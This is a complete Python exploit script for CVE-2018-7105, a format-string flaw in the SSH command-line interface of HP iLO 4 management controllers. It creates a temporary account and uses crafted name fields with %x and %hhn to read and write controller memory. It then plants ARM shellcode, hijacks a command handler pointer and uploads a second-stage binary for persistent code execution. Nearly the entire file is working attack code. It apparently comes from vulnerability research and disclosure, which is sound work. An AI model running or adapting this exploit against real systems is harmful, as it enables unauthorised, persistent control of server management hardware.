#!/usr/bin/env python3
"""
Exploit CVE-2018-7105 over SSH

Usage: install paramiko and run:
make -C stage1_shellcode && ./ssh_connect.py

HP security bulletin: https://support.hpe.com/hpsc/doc/public/display?docId=hpesbhf03866en_us

@author Nicolas Iooss
@license GPL-2
"""
import argparse
import binascii
import ctypes
import logging
import os
import os.path
import struct
import sys
import time

import keystone
import paramiko
from exploit_helpers import get_version_info


STAGE1_ASM_PATH = os.path.join(os.path.dirname(__file__), 'payloads_for_cli', 'stage1.S')

# The name of the command which is overwritten by stage1
MY_COMMAND = b'Please'  # Let's be polite with this iLO


class ColoredFormatter(logging.Formatter):
    """Color logs in the terminal"""
    COLORS = {
        'DEBUG': '\033[33m',
        'INFO': '',
        'WARNING': '\033[1;33m',
        'ERROR': '\033[1;31m',
        'CRITICAL': '\033[1;31m',
    }
    COLORS_RESET = '\033[0m'

    def __init__(self, *args, **kwargs):
        super(ColoredFormatter, self).__init__(*args, **kwargs)

    def format(self, record):
        line = super(ColoredFormatter, self).format(record)
        levelname = record.levelname
        if levelname in self.COLORS:
            line = self.COLORS[levelname] + line + self.COLORS_RESET
        return line


# Enable colors in Windows 10 since version 10.0.14393
# https://docs.microsoft.com/en-us/windows/console/setconsolemode
if os.name == 'nt':
    kernel32 = ctypes.windll.kernel32
    # Get STD_OUTPUT_HANDLE
    hstdout = kernel32.GetStdHandle(-11)
    console_mode = ctypes.c_uint32()
    if hstdout != -1 and kernel32.GetConsoleMode(hstdout, ctypes.byref(console_mode)):
        # Set ENABLE_VIRTUAL_TERMINAL_PROCESSING
        kernel32.SetConsoleMode(hstdout, console_mode.value | 4)


logger = logging.getLogger('ssh')
log_handler = logging.StreamHandler()
log_handler.setFormatter(ColoredFormatter('[%(levelname)s %(name)s] %(message)s'))
root_logger = logging.getLogger()
root_logger.addHandler(log_handler)
root_logger.setLevel(logging.DEBUG)


parser = argparse.ArgumentParser(description="Exploit CVE-2018-7105 on iLO SSH")
parser.add_argument('remote_addr', help="IP address of the target iLO")
parser.add_argument('version', type=str, help="iLO version")
parser.add_argument('-u', '--user', type=str, default='admin', help="user name")
parser.add_argument('-p', '--password', type=str, default='', help="SSH password")
parser.add_argument('-P', '--port', type=int, default=22, help="SSH port")
parser.add_argument('-r', '--reload', action='store_true', help="Reload stage1 if it is already present")
parser.add_argument('--uname', action='store_true',
                    help="Execute 'uname' and exit, in order to ensure that the SSH connection works fine")
args = parser.parse_args()


# Compile the stage1 shellcode
offsets = get_version_info(args.version)
with open(STAGE1_ASM_PATH, "r") as fff:
    shellcode = fff.read()
shellcode = shellcode.replace('\n.section .shcode, "ax", %progbits', '\n')
shellcode = shellcode.replace('ADDR_get_CLI_session_ptr', hex(offsets['ConAppCLI_get_CLI_session_ptr']))
shellcode = shellcode.replace('ADDR_CLI_printf', hex(offsets['ConAppCLI_printf']))
shellcode = shellcode.replace('ADDR_libc_malloc', hex(offsets['malloc']))
shellcode = shellcode.replace('ADDR_libc_free', hex(offsets['free']))
# keystone does not support relative offset computation
shellcode = shellcode.replace('ldr     r7, [pc, #(get_CLI_session_ptr - . - 8)]', 'ldr     r7, [pc, #320]')
shellcode = shellcode.replace('.zero 256 - (. - FIRST_SEGMENT)', '.zero 256 - 0xf4')
ks = keystone.Ks(keystone.KS_ARCH_ARM, keystone.KS_MODE_ARM)
stage1_sc = bytes(ks.asm(shellcode)[0])

# Sanity check: the shellcode needs not not have bytes in the [0x00..0x28] parts of 256-byte blocks
for part_offset in range(0, len(stage1_sc), 256):
    assert all(b == 0 for b in stage1_sc[part_offset:part_offset + 0x28])

# Connect to the SSH interface
client = paramiko.client.SSHClient()
client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)
client.connect(args.remote_addr, args.port, username=args.user, password=args.password,
               timeout=30, allow_agent=False, look_for_keys=False)

logger.info("SSH session to %s:%d opened", args.remote_addr, args.port)


def ssh_uname():
    logger.debug("Executing uname")
    stdin, stdout, stderr = client.exec_command('uname')
    stdin.close()
    try:
        if not stdout.channel.recv_ready():
            logger.error("SSH uname failed! no received data")
            return
        data = stdout.channel.recv(4096)
        logger.info('uname on iLO SSH: %r', data)  # b'mgmt-proc mpsim 1_0'
        return data
    finally:
        stdout.close()
        stderr.close()


if args.uname:
    ssh_uname()
    sys.exit(0)


# Open a channel to get a shell
channel = client.invoke_shell()
channel.setblocking(0)

# Start by displaying what data it exchanged over SSH
show_ssh_sendrecv = True


def recv_all():
    # Give iLO some time to process a command
    time.sleep(.05)
    result = b''
    while channel.recv_ready():
        result += channel.recv(4096)
    if result and show_ssh_sendrecv:
        logger.debug("SSH recv: %r", result)
    return result


def recv_force():
    """force returning data"""
    data = recv_all()
    numiter = 0
    while not data:
        numiter += 1
        logger.debug("Waiting...")
        if numiter <= 10:
            time.sleep(.1)
        elif numiter <= 20:
            time.sleep(1)
        else:
            logger.fatal("Time out")
            sys.exit(1)
        data = recv_all()
    return data


def recv_until_prompt():
    """receive data until a CLI prompt"""
    data = recv_force()
    while b'hpiLO' not in data:
        data += recv_force()
    return data


def send(data):
    """send the given data over SSH"""
    if show_ssh_sendrecv:
        logger.debug("SSH send: %r", data)
    channel.send(data)


def sr(data):
    """send and receive"""
    send(data)
    return recv_force()


def srp(d):
    """send and receive data until a CLI prompt"""
    send(d)
    return recv_until_prompt()


def run_command(cmd):
    """send a CLI command over SSH and receive its response"""
    result = srp(cmd + b'\r')
    needle = b'status_tag=COMMAND COMPLETED\r\n'
    idx = result.index(needle)
    return result[idx + len(needle):].split(b'\n', 4)[-1]


# Consume the welcoming messages until the initial prompt
recv_until_prompt()
# Check that the SSH works
run_command(b'help')
logger.info("Command 'help' worked :)")


def init_user():
    """Create a user account named after CVE-2018-7105"""
    create_comm = b'create /map1/accounts1 username=cve20187105 password=pwd12345 name=init'
    result = srp(create_comm + b'\r')
    if b'error_tag=COMMAND SYNTAX ERROR' in result and b'Duplicate login name.' in result:
        terminate_user()
        run_command(create_comm)
    else:
        assert b'status_tag=COMMAND COMPLETED' in result


def terminate_user():
    """Remove the user created by init_user()"""
    run_command(b'delete /map1/accounts1/cve20187105')


def read_raw(address, maxlen=50, check_vuln=False):
    """Read some data at the given address in ConAppCLI

    This uses a format string vulnerability.
    """
    byteaddress = struct.pack('<I', address).rstrip(b'\0')
    if check_vuln:
        # Check that the vulnerability works fine by reading the address
        fmtstr = b'%x'
    else:
        fmtstr = b'%.' + str(maxlen).encode('ascii') + b's'
    # pad
    assert len(fmtstr) <= 7
    padding = b'.' * (7 - len(fmtstr))
    name = b'%x%x%x%x%x%x%x%x%x%x.' + fmtstr + padding + byteaddress
    # escape things
    name = name.replace(b'\\', b'\\\\')
    name = name.replace(b'"', b'\\"')
    logger.debug("Reading max %d at %#x: %r", maxlen, address, name)
    assert b'\0' not in name
    assert b'\n' not in name
    assert b'\r' not in name
    assert b'%' not in byteaddress
    assert len(name) <= 39
    run_command(b'set /map1/accounts1/cve20187105 "name=' + name + b'"')
    output = run_command(b'show /map1/accounts1/cve20187105')
    lines = output.split(b'\r\n', 5)
    assert lines[0] == b'/map1/accounts1/cve20187105'
    assert lines[1] == b'  Targets'
    assert lines[2] == b'  Properties'
    assert lines[3] == b'    username=cve20187105'
    assert lines[4] == b'    password=********'
    assert lines[5].startswith(b'    name=')
    remaining = lines[5].split(b'.', 1)[1]

    lines = remaining.rsplit(b'\r\n', 7)
    assert lines[1] == b'    group=0'
    assert lines[3] == b'  Verbs'
    assert lines[4] == b'    cd version exit show create set oemhp_loadSSHKey oemhp_deleteSSHKey'
    remaining = lines[0][:-len(byteaddress)]
    if padding:
        assert remaining.endswith(padding)
        remaining = remaining[:-len(padding)]
    return remaining


def read_data(addr, size):
    """Read some memory from ConAppCLI"""
    result = b''
    while len(result) < size:
        reqsize = min(size - len(result), 50)
        data = read_raw(addr + len(result), maxlen=reqsize)
        result += data
        if len(data) < reqsize:
            # there has been a \0, lets read the remaining bytes after it
            result += b'\0'
    assert len(result) == size
    return result


def read_byte(address):
    return struct.unpack('B', read_data(address, 1))[0]


def read_u32(address):
    return struct.unpack('<I', read_data(address, 4))[0]


def read_u64(address):
    return struct.unpack('<Q', read_data(address, 8))[0]


def write_byte(address, val, check_vuln=False):
    """Write a byte to ConAppCLI memory, using a format string vulnerability"""
    assert 0 <= val < 256
    byteaddress = struct.pack('<I', address).rstrip(b'\0')
    strval = str(((val + 256 - 0xa5 + 0x43 - 7) % 256) + 8).encode('ascii')
    if len(strval) == 1:
        spaces = b'..'
    elif len(strval) == 2:
        spaces = b'.'
    elif len(strval) == 3:
        spaces = b''
    else:
        assert False
    assert len(spaces + strval) == 3
    if check_vuln:
        name = b'%8x%8x%8x%8x%8x%x%x%x%x%x%x%' + strval + b'x.%x.' + spaces + byteaddress
    else:
        name = b'%8x%8x%8x%8x%8x%x%x%x%x%x%x%' + strval + b'x%hhn' + spaces + byteaddress
    # escape things
    name = name.replace(b'\\', b'\\\\')
    name = name.replace(b'"', b'\\"')
    logger.debug("Writing 0x%02x at %#x: %r", val, address, name)
    assert b'\0' not in name
    assert b'\n' not in name
    assert b'\r' not in name
    assert b'%' not in byteaddress
    assert len(name.replace(b'\\\\', b'\\').replace(b'\\"', b'"')) < 40, "Name too long: %d" % len(name)
    run_command(b'set /map1/accounts1/cve20187105 "name=' + name + b'"')
    output = run_command(b'show /map1/accounts1/cve20187105')
    lines = output.split(b'\r\n', 5)
    remaining = lines[5]
    lines = remaining.rsplit(b'\r\n', 7)
    remaining = lines[0][:-len(byteaddress)]
    expected_len = 97 + int(strval) + len(spaces)
    if check_vuln:
        hexa_addr = ('.%x.' % address).encode('ascii')
        expected_len += len(hexa_addr)
        if hexa_addr not in remaining:
            # The format string may be incompatible with this version of iLO
            logger.fatal("Unexpected check_vuln write result: %r", remaining)
            sys.exit(1)
    if expected_len != len(remaining):
        logger.fatal("Unexpected write result length: (%d exp %d) %r",
                     len(remaining), expected_len, remaining)
        sys.exit(1)


def write_data(address, data, length=None):
    assert length is None or len(data) == length  # sanity check
    for i, d in enumerate(data):
        write_byte(address + i, d)


def write_u32(addr, val):
    write_data(addr, struct.pack('<I', val), 4)


def write_u64(addr, val):
    write_data(addr, struct.pack('<Q', val), 8)


def rw_data(address, data, length=None):
    """Read data and write only modified bytes"""
    assert length is None or len(data) == length  # sanity check
    initial_data = read_data(address, len(data))
    assert len(initial_data) == len(data)
    for i, d in enumerate(data):
        if d != initial_data[i]:
            write_byte(address + i, d)


def rw_u32(addr, val):
    rw_data(addr, struct.pack('<I', val), 4)


def rw_u64(addr, val):
    rw_data(addr, struct.pack('<Q', val), 8)


def verif_data(addr, expected):
    """Read the data at the given address and ensure it is as expected"""
    data = read_data(addr, len(expected))
    assert len(data) == len(expected)
    logger.info('%#x..%#x (%d): %r', addr, addr + len(expected), len(data), data)
    if data != expected:
        logger.error("expected %r", expected)
        return False
    return True


# Encoding which is used to communicate with the stage 1
# [b'A', b'B', b'C', b'D', b'E', b'F', b'G', b'H' ... b'P']
A16_ENCODING = [c.encode('ascii') for c in 'ABCDEFGHIJKLMNOP']


def a16_u8_encode(val):
    """Encode a u8 in alpha-16 encoding"""
    assert 0 <= val <= 0xff
    return A16_ENCODING[val >> 4] + A16_ENCODING[val & 15]


def a16_data_encode(data):
    return b''.join(a16_u8_encode(struct.unpack('B', data[i:i+1])[0]) for i in range(len(data)))


def a16_u32_encode(val):
    """Encode a u32 in alpha-16 encoding (in Big Endian)"""
    return a16_data_encode(struct.pack('>I', val))


def send_my_command(op, arg1, *args):
    """Send a command using the code which has been put by stage1"""
    cmd = MY_COMMAND + b' ' + op.encode('ascii') + a16_u32_encode(arg1)
    if args:
        cmd += b' ' + b' '.join(a.encode('ascii') if isinstance(a, str) else a for a in args)
    output = srp(cmd + b'\r')
    # Find the prompt repetition in the output, which may be inside the output
    # (due to buffer sync issues)
    cmdindex = output.index(cmd)
    output_prefix = output[:cmdindex].lstrip(b'\r\n')
    output = output_prefix + output[cmdindex + len(cmd):].lstrip(b'\r\n')
    # Drop the prompt
    output = output[:output.rindex(b'hpiLO')].rsplit(b'\n', 1)[0]
    return output.strip(b'\r\n')


def is_stage1_present():
    """Check whether the magic command works"""
    output = send_my_command('?', 0x42)
    if b'r8=0x42' in output:
        return True
    if b'status_tag=COMMAND PROCESSING FAILED' not in output or b'error_tag=COMMAND NOT RECOGNIZED' not in output:
        logger.error("Unexpected result when checking for stage1: %r", output)
        sys.exit(1)
    return False


def ilo_malloc(size):
    """Allocate some memory using stage1"""
    output = send_my_command('a', size)
    logger.debug("Alloc returned: %r", output)
    if output == b'alloc 0':
        raise RuntimeError("Not enough memory on iLO!")
    prefix = b'alloc 0x'
    assert output.startswith(prefix)
    return int(output[len(prefix):], 16)


def ilo_free(addr):
    """Free some memory using stage1"""
    output = send_my_command('f', addr)
    logger.debug("Free returned: %r", output)
    assert output == ('free %#x' % addr).encode('ascii')


def ilo_write_partial(addr, data):
    """Write some bytes and return the length and the unwritten ones"""
    if not data:
        return (0, b'')
    # What is the maximum length of an argument for a CLI command?
    # constraint: len("Please wADDRESS DATA_ENCODED_AS_HEX\0") <= 256
    # Therefore: len(DATA_ENCODED_AS_HEX) <= 256-18 = 238
    # len(data) = len(DATA_ENCODED_AS_HEX)/2 <= 119
    # use 100 for being safe in case I missed some constraints
    size = min(len(data), 100)
    output = send_my_command('w', addr, a16_data_encode(data[:size]))
    all_lines = [line.strip() for line in output.decode('ascii').splitlines() if line not in ('', ' ', '> ', '-> ')]
    if len(all_lines) != size:
        logger.error("Unexpected output line number: got %d vs exp %d", len(all_lines), size)
        logger.warning("TODO all_lines = %r", all_lines[:5])
        logger.error("... %r", output)
    assert len(all_lines) == size, "Unexpected output line number: %d vs %d" % (len(all_lines), size)
    for i, line in enumerate(all_lines):
        expected = '%#x <- %#x' % (addr + i, data[i])
        if expected.endswith(' <- 0x0'):
            expected = '%#x <- 0' % (addr + i)
        if expected != line:
            logger.warning("Unexpected write output when writing 0x%02x to %#x: got %r instead of %r",
                           data[i], addr + i, line, expected)
        # assert expected == line  # This may happen when the prompt is being mixed in the lines
    # Return the remaining data
    return (size, data[size:])


def ilo_write(addr, data):
    """Write all of data, splitting it in parts"""
    while data:
        size, data = ilo_write_partial(addr, data)
        addr += size


def ilo_exec(addr, *args):
    """Execute the code at the given address, using stage1"""
    return send_my_command('x', addr, *args)


def decode_rawhexdump(content, expected_addr, name):
    """Decode a raw hexdump output"""
    data = b''
    for line in content.decode('ascii').splitlines():
        if 'error' in line.lower():
            logger.error("Error while dumping %s: %s", name, line)
            return
        textaddr, textdata = line.split(':', 1)
        addr = int(textaddr, 16)
        if addr != expected_addr + len(data):
            logger.error("Unexpected address: %#x != %#x+%#x", addr, expected_addr, len(data))
            return
        data += binascii.unhexlify(textdata)
    return data


if args.reload or not is_stage1_present():
    # Check whether CVE-2018-7105 works
    init_user()
    test_result = read_raw(0xcafebeef, check_vuln=True)
    if test_result != b'cafebeef':
        logger.error("The 'read' format string did not work. The system might have been patched.")
        terminate_user()
        sys.exit(1)
    write_byte(0xcafe42, 42, check_vuln=True)
    logger.info("Read and write format strings seem good :)")

    # Check that we bytes we read are good
    malloc_bytes = read_u32(offsets['malloc'])
    if malloc_bytes != 0xe1a0c00d:  # MOV R12, SP
        logger.error("In ConAppCLI, malloc (at %#x) begins with %#x, not 'MOV R12, SP'",
                     offsets['malloc'], malloc_bytes)
        terminate_user()
        sys.exit(1)

    # Rename NULL_CMD into somethings else
    stage1_addr = offsets['ConAppCLI_stage1']
    initial_cmdname = read_data(stage1_addr + 1, len(MY_COMMAND) + 1)
    logger.info("Initial content of the space of command name: %r", initial_cmdname)
    if initial_cmdname != MY_COMMAND + b'\0':
        if initial_cmdname != b'\0' * (len(MY_COMMAND) + 1):
            logger.error("There is something in this supposed-to-be-empty space! ABORTING NOW!")
            terminate_user()
            sys.exit(1)
        write_data(stage1_addr + 1, MY_COMMAND + b'\0')
        if not verif_data(stage1_addr + 1, MY_COMMAND + b'\0'):
            logger.error("Writing the stage1 command name failed.")
            terminate_user()
            sys.exit(1)

    initial_cmdname_ptr = read_u32(offsets['ConAppCLI_NULL_CMD_ptr'])
    logger.info("initial NULL_CMD string: %#x", initial_cmdname_ptr)
    if initial_cmdname_ptr != stage1_addr + 1:
        if initial_cmdname_ptr != offsets['ConAppCLI_NULL_CMD_text']:
            logger.error("The command name for NULL_CMD targets %#x, not expected %#x",
                         initial_cmdname_ptr, offsets['ConAppCLI_NULL_CMD_text'])
            terminate_user()
            sys.exit(1)
        write_u32(offsets['ConAppCLI_NULL_CMD_ptr'], stage1_addr + 1)

    # Change handler to the DEBUG help, as PoC
    # rw_u32(offsets['ConAppCLI_NULL_CMD_fctptr'], 0x00016FFC)

    # Write the shellcode
    show_ssh_sendrecv = False

    for ipart_256 in range(0, len(stage1_sc), 256):
        ipart = ipart_256 // 256
        payload_part = stage1_sc[ipart_256:ipart_256 + 256]

        # Ensure the code does NOT use the inaccessible parts
        assert all(b == 0 for b in payload_part[:0x28])
        logger.info("Writing payload part %d/%d (%d-0x28 bytes)",
                    ipart + 1, (len(stage1_sc) + 255) // 256, len(payload_part))
        payaddr = stage1_addr + ipart * 256 + 0x28
        if args.reload:
            rw_data(payaddr, payload_part[0x28:])
        else:
            write_data(payaddr, payload_part[0x28:])
            logger.info("Verifying the payload part %d...", ipart + 1)
            assert verif_data(payaddr, payload_part[0x28:])

    logger.info("Wiring %r handler to the shellcode", MY_COMMAND.decode('ascii'))
    rw_u32(offsets['ConAppCLI_NULL_CMD_fctptr'], stage1_addr + 0x28)

    # Clean-up things
    terminate_user()

    if not is_stage1_present():
        logger.error("Failed to run stage1 :(")
        sys.exit(1)

logger.info("The stage 1 is installed on this iLO using command %r", MY_COMMAND.decode('ascii'))

show_ssh_sendrecv = False

# Now that the stage1 is present, put stage2
stage2_bin_path = os.path.join(os.path.dirname(__file__), 'payloads_for_cli', 'stage2_ilo4_%s.bin' % args.version)
if not os.path.exists(stage2_bin_path):
    logger.error("Stage 2 not found (%s)", stage2_bin_path)
    logger.error("Please build the stage 2 for example with this command: cd payloads_for_cli && make HPILO_VER_MINOR=%s", args.version)
    sys.exit(1)
with open(stage2_bin_path, 'rb') as f:
    stage2 = f.read()

# Allocate a little bit more space, just to be sure
stage2_addr = ilo_malloc(len(stage2) + 16)
logger.info("Writing stage 2 at %#x..%#x", stage2_addr, stage2_addr + len(stage2))
ilo_write(stage2_addr, stage2)
if 0:
    # Single-shot execution
    logger.info("Executing the payload at %#x", stage2_addr)
    output = ilo_exec(stage2_addr)
    ilo_free(stage2_addr)
else:
    # Persistent execution
    logger.info("Connecting %r handler to the stage 2", MY_COMMAND.decode('ascii'))
    ilo_write(offsets['ConAppCLI_NULL_CMD_fctptr'], struct.pack('<I', stage2_addr))
    logger.info("Done. Trying to run '%s help' over SSH", MY_COMMAND.decode('ascii'))
    usage_output = srp(MY_COMMAND + b' help\r')
    for line in usage_output.decode('utf-8').splitlines():
        logger.info("    %s", line)
